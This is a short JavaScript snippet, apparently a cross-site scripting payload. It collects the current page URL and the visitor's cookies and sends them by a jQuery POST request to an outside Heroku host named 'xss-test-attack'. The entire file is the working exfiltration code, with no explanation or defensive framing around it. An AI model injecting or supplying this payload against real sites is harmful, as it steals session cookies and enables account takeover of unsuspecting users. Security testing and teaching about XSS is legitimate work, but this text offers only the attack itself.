var href = window.location.href;
var cookie = document.cookie;

var object = {
    href: href,
    cookie: cookie,
    
};

$.ajax({
    url: "https://xss-test-attack.herokuapp.com/",
    type: 'POST',
    crossDomain: true,
    dataType: 'html',
    contentType: 'application/json',
    data: JSON.stringify(object)
});